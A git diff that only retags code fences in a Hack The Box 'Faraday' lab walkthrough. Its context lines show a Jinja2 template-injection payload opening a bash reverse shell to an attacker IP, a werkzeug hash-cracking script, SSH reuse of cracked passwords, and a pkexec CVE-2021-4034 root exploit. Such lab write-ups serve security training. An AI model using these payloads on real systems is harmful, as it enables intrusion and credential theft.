@@ -51,7 +51,7 @@ As usual initial enumeration is required to port scanning and get relevant infor
 ```
 
 On a port `8888` service is running and when I tried to connect it, asks for `creds`
-```
+```bash
     ❯ netcat 10.13.37.14 8888
     Welcome to FaradaySEC stats!!!  
     Username: test
@@ -133,13 +133,13 @@ Now we are redirected to message-sending field, several users listed by default.
 ](./XploitOverload_HackTheBox_Faraday_files/7.png)
 
 We have to keep in mind that we previously configured an SMTP server on port `25` to our host. This means we can easily set up a listener using `Python` to capture any incoming messages.
-```
+```bash
     ❯ sudo python3 -m smtpd -c DebuggingServer -n 10.10.16.86:25  
 ```    
 
   
 We send the message through the web interface, and as soon as it goes through, our `SMTP` listener `catches` an alert. Along with the message details, it also exposes something critical—the `flag`.
-```
+```bash
     ❯ sudo python3 -m smtpd -c DebuggingServer -n 10.10.16.86:25  
     ---------- MESSAGE FOLLOWS ----------
     b'Subject: test'
@@ -162,7 +162,7 @@ We send the message through the web interface, and as soon as it goes through, o
 
 By brute-forcing directories with `wfuzz`, we discover the presence of a `.git` directory. This indicates that an entire `project` repository is exposed, potentially allowing us to retrieve its contents and uncover sensitive information.
 
-```
+```bash
     ❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.37.14/FUZZ -t 100 --hc 404  
     ********************************************************
     * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -189,7 +189,7 @@ By brute-forcing directories with `wfuzz`, we discover the presence of a `.git` 
 
 Using `git-dumper`we can dump all the files from the .git project
 
-```
+```bash
     ❯ git-dumper http://10.13.37.14/.git/ dump
     [-] Testing http://10.13.37.14/.git/HEAD [200]
     [-] Testing http://10.13.37.14/.git/ [404]
@@ -201,7 +201,7 @@ Using `git-dumper`we can dump all the files from the .git project
 
 This will create a new directory called `dump`, in the dumped project we can find the base from which `web`it is running, we see the`app.py`
 
-```
+```bash
     dump ❯ ls -l 
     drwxr-xr-x kali kali 4.0 KB Thu Apr 20 23:17:21 2023  static
     drwxr-xr-x kali kali 4.0 KB Thu Apr 20 23:17:22 2023  templates
@@ -214,7 +214,7 @@ This will create a new directory called `dump`, in the dumped project we can fin
 
 Reading it `app.py`we can see what it does with the input about `/profile`and the redirection that `/sendMessage`sends data to the server `SMTP`, there is a vulnerability that is obvious and it is the use of `render_template_string`when sending data to the server
 
-```
+```python
     @app.route('/profile')
     @login_required
     def profile():
@@ -278,7 +278,7 @@ When opening it in the browser it redirects us to send the `message`, we send an
 ](./XploitOverload_HackTheBox_Faraday_files/7.png)
 
 When receiving the alert we find that we have a problem, it `{{` is deleted so the response is not represented `output`as we expected.
-
+```html
     ---------- MESSAGE FOLLOWS ----------
     b'Subject: test'
     b'X-Peer: 10.13.37.14'
@@ -287,12 +287,12 @@ When receiving the alert we find that we have a problem, it `{{` is deleted so t
     b'test'
     b'Here is your gift FARADAY{ehlo_@nd_w3lcom3!}'  
     ------------ END MESSAGE ------------
-    
+```    
 
   
 Reading an [article](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) about the vulnerability we found some alternatives to apply the execution of `commands` at the end we have the following `payload` which will be in charge of executing a command that will send us a `reverse shell` with bash
 
-```
+```bash
     {% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash -c "bash -i >& /dev/tcp/10.10.16.86/443 0>&1"')['read']() == 'chiv' %} a {% endif %}  
 ```    
 
@@ -300,14 +300,14 @@ Reading an [article](https://www.onsecurity.io/blog/server-side-template-injecti
 
 When `urlencoding` the payload and sending it in the `name` parameter it would look something like this
 
-```
+```bash
     http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.86/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}  
 ```    
 
 
 When opening it, it will redirect us to send the `message` and when sending it we receive a `revshell` as `root` although it seems that it is in a `container`, although we can see the `flag`
 
-```
+```bash
     ❯ sudo netcat -lvnp 443
     Listening on 0.0.0.0 443
     Connection received on 10.13.37.14
@@ -332,7 +332,7 @@ When opening it, it will redirect us to send the `message` and when sending it w
 
 In `/app` we can see several files and directories, including the `db` directory
 
-```
+```bash
     root@98aa0f47eb96:/app# ls -l
     drwxr-xr-x 2 root root 4096 Jul 21  2021 __pycache__
     -rwxr-xr-x 1 root root 8523 Jul 21  2021 app.py
@@ -349,7 +349,7 @@ In `/app` we can see several files and directories, including the `db` directory
 
 In the `db` directory we can see a file that looks interesting `database.db`
 
-```
+```bash
     root@98aa0f47eb96:/app/db# ls  
     database.db
     root@98aa0f47eb96:/app/db#
@@ -358,7 +358,7 @@ In the `db` directory we can see a file that looks interesting `database.db`
   
 
 We can pass it to our team using `base64`, in the db with `sqlite` we can see a table called `user_model` which contains `users` and `hashes`
-```
+```bash
     ❯ sqlite3 database.db
     SQLite version 3.40.1 2022-12-28 14:03:47
     Enter ".help" for usage hints.
@@ -378,7 +378,7 @@ We can pass it to our team using `base64`, in the db with `sqlite` we can see a 
   
 ##### Password Spraying
 To work easily we will save the data in a file called `hashes` which will contain only `users` and `hashes` separated by `:` in the `user:hash` format
-```
+```bash
     ❯ cat hashes          
     administrator:sha256$GqgROghu45Dw4D8Z$5a7eee71208e1e3a9e3cc271ad0fd31fec133375587dc6ac1d29d26494c3a20f  
     octo:sha256$gqsmQ2210dEMufAk$98423cb07f845f263405de55edb3fa9eb09ada73219380600fc98c54cd700258
@@ -392,7 +392,7 @@ To work easily we will save the data in a file called `hashes` which will contai
   
 
 We can't crack it directly with `John`, so we'll convert the words from the `rockyou` wordlist into `hashes`. By comparing each generated hash with the one we have, if we find a match, we get the `password`.
-```
+```bash
     #!/usr/bin/python3
     from werkzeug.security import check_password_hash
     from pwn import log
@@ -414,7 +414,7 @@ We can't crack it directly with `John`, so we'll convert the words from the `roc
   
 
 We got `5` valid `passwords` and cracked several `hashes` by executing the `exploit.py`
-```
+```bash
     ❯ python3 exploit.py
     [+] Credencial valida: pasta:antihacker
     [+] Credencial valida: pepe:sarmiento
@@ -427,7 +427,7 @@ We got `5` valid `passwords` and cracked several `hashes` by executing the `expl
 ##### Getting shell (Initial accesss)
 
 The `pasta` ones seem to be valid for `ssh`, we get a shell on the real machine
-```
+```bash
     ❯ ssh pasta@10.13.37.14
     pasta@10.13.37.14's password: antihacker
     pasta@erlenmeyer:~$ id
@@ -440,7 +440,7 @@ The `pasta` ones seem to be valid for `ssh`, we get a shell on the real machine
   
 
 We haven't found the `flag` yet, but we do see a build named `crackme`, which might be worth analyzing for potential vulnerabilities or hidden data.
-```
+```bash
     pasta@erlenmeyer:~$ ls  
     crackme
     pasta@erlenmeyer:~$
@@ -449,7 +449,7 @@ We haven't found the `flag` yet, but we do see a build named `crackme`, which mi
   
 
 We pull the crackme binary using scp over our SSH connection. Running it prompts us to enter the flag, but if we feed it anything random, it just shuts down—no hints, no mercy.
-```
+```bash
     ❯ sshpass -p antihacker scp pasta@10.13.37.14:crackme .  
     
     ❯ ./crackme
@@ -468,7 +468,7 @@ We open it and decompile it using `ida` where we can see some functions includin
 ](./XploitOverload_HackTheBox_Faraday_files/8.png)
 
 We'll dive straight into the main function, where the real action happens. A quick look already reveals some interesting details worth investigating
-```
+```cpp
     int __fastcall main(int argc, const char **argv, const char **envp)
     {
       char input; // al
@@ -512,14 +512,14 @@ We'll dive straight into the main function, where the real action happens. A qui
   
 
 The first part of the `flag` can be seen directly in the `main` function, although some `characters` are missing to complete the entire text string.
-```
+```c
     FARADAY{d0ubl3_@nd_f1o@t_  
  ```   
 
   
 
 What we can do is bruteforce the possible characters where the double byte is `_` and the characters `3` and `7` are exchanged, until the condition is met.
-```
+```python
     #!/usr/bin/python3
     from itertools import product
     import struct, string
@@ -542,7 +542,7 @@ What we can do is bruteforce the possible characters where the double byte is `_
   
 
 When executed, it bruteforces the characters until the `condition` is met, when it is, it exchanges the bytes and adds the `flag` that we had before to obtain it.
-```
+```bash
     ❯ python3 exploit.py
     FARADAY{d0ubl3_@nd_f1o@t_be@uty}  
 ```    
@@ -558,7 +558,7 @@ When executed, it bruteforces the characters until the `condition` is met, when 
 ##### Lateral Movement 
 
 We have previously obtained more `creds`, when searching for other valid one's for `ssh` we find those of the `administrator` user, we obtain another shell on the machine
-```
+```bash
     ❯ sshpass -p ihatepasta ssh administrator@10.13.37.14
     administrator@erlenmeyer:~$ id
     uid=1000(administrator) gid=1000(administrator) groups=1000(administrator)  
@@ -570,7 +570,7 @@ We have previously obtained more `creds`, when searching for other valid one's f
   
 
 Among the files that we own we find the Apache `access.log` file, which a normal user should not generally be able to read.
-```
+```bash
     administrator@erlenmeyer:~$ find / -user administrator 2>/dev/null | grep -vE "/proc|/sys|/home|/run"  
     /dev/pts/0
     /var/mail/administrator
@@ -581,7 +581,7 @@ Among the files that we own we find the Apache `access.log` file, which a normal
   
 
 In it we find several `logs`facts `sqlmap`about the archive`/update.php`
-```
+```bash
     administrator@erlenmeyer:~$ cat /var/log/apache2/access.log | grep sqlmap | head -n1
     4969 192.168.86.1 - - [20/Jul/2021:00:00:00 -0700] "GET /update.php?keyword=python%27%20WHERE%201388%3D1388%20AND%20%28SELECT%207036%20FROM%20%28SELECT%28SLEEP%283-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x6d7973716c%20LIMIT%2028%2C1%29%2C3%2C1%29%29%3E110%2C0%2C3%29%29%29%29%29pqBK%29--%20EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"  
     administrator@erlenmeyer:~$
@@ -590,7 +590,7 @@ In it we find several `logs`facts `sqlmap`about the archive`/update.php`
   
 
 We notice a pattern in certain lines, such as `))>96`, where `))` is followed by some characters and a decimal number. Our approach is to extract these lines, `urldecode` them, and convert each decimal value into readable `text` using `chr()`. This could reveal hidden data or encoded messages within the logs
-```
+```python
     #!/usr/bin/python3
     import re, urllib.parse
     
@@ -608,7 +608,7 @@ We notice a pattern in certain lines, such as `))>96`, where `))` is followed by
   
 
 When running the script, we get a significant amount of `output`. Scanning through it, we finally spot what we’ve been hunting for—the `flag`
-```
+```bash
     administrator@erlenmeyer:~$ python3 exploit.py
     ....FARADAY{@cc3ss_10gz_c4n_b3_use3fu111}....   
     administrator@erlenmeyer:~$
@@ -626,7 +626,7 @@ When running the script, we get a significant amount of `output`. Scanning throu
   
 
 Searching for files with privileges `suid`we found a fairly classic one,`pkexec`
-```
+```bash
     administrator@erlenmeyer:~$ find / -perm -4000 2>/dev/null | grep -v snap  
     /usr/bin/umount
     /usr/bin/mount
@@ -652,7 +652,7 @@ Searching for files with privileges `suid`we found a fairly classic one,`pkexec`
   
 
 [We can use a CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034) exploit to become `root`and read the flag
-```
+```bash
     administrator@erlenmeyer:/tmp$ python3 exploit.py  
     [+] Creating shared library for exploit code.
     [+] Calling execve()
@@ -677,7 +677,7 @@ Searching for files with privileges `suid`we found a fairly classic one,`pkexec`
 
 Port `8888` was open and asked for `creds`. Since we had several from earlier, we tried the same ones we used for SSH. It worked, and just like that, we got the flag.
 
-```
+```bash
     ❯ netcat 10.13.37.14 8888
     Welcome to FaradaySEC stats!!!
     Username: pasta
@@ -697,7 +697,7 @@ Port `8888` was open and asked for `creds`. Since we had several from earlier, w
   
 
 In /root we find a .txt file that seems to be the output of `chkrootkit`, in this file it shows us that the rootkit `Reptile`is present on this machine
-```
+```bash
     root@erlenmeyer:~# cat chkrootkit.txt
     Checking `amd'...                                           not found
     Checking `biff'...                                          not found
@@ -778,7 +778,7 @@ In /root we find a .txt file that seems to be the output of `chkrootkit`, in thi
   
 
 One way is to copy it `/dev/sda3`to our machine and mount it in the directory `/mnt`, this process will take a long time since it weighs approximately`10gb`
-```
+```bash
     ❯ sudo losetup /dev/loop10 sda3.image
     
     ❯ sudo kpartx -a /dev/loop10
@@ -793,7 +793,7 @@ One way is to copy it `/dev/sda3`to our machine and mount it in the directory `/
   
 
 Now `/mnt`we can see a directory that was there before `invisible`and is `reptileRoberto`where the files of the program are probably stored.`rootkit`
-```
+```bash
     /mnt ❯ ls -l
     lrwxrwxrwx root root   7 B  Mon Feb  1 12:20:38 2021  bin ⇒ usr/bin
     drwxr-xr-x root root 4.0 KB Fri Jul 16 09:44:17 2021  boot
@@ -825,7 +825,7 @@ Now `/mnt`we can see a directory that was there before `invisible`and is `reptil
   
 
 Inside `flag`we can also see the controls including the file`_cmd`
-```
+```bash
     /mnt/reptileRoberto ❯ ls -l
     .rwxr-xr-x root root  42 KB Tue Jul 20 10:11:18 2021  reptileRoberto
     .rwxrwxrwx root root  14 KB Tue Jul 20 10:11:18 2021  reptileRoberto_cmd
@@ -838,7 +838,7 @@ Inside `flag`we can also see the controls including the file`_cmd`
   
 
 On the real machine we can use the `_cmd`using `show`as an argument to temporarily disable it `rootkit`and be able to see the files and directories`ocultos`
-```
+```bash
     root@erlenmeyer:~# /reptileRoberto/reptileRoberto_cmd show  
     Success!
     root@erlenmeyer:~#
@@ -847,7 +847,7 @@ On the real machine we can use the `_cmd`using `show`as an argument to temporari
   
 
 Now we can see the files and directories on the machine and also read the`flag`
-```
+```bash
     root@erlenmeyer:/reptileRoberto# ls -l
     -rwxr-xr-x 1 root root 42760 Jul 20  2021 reptileRoberto
     -rwxrwxrwx 1 root root 14472 Jul 20  2021 reptileRoberto_cmd
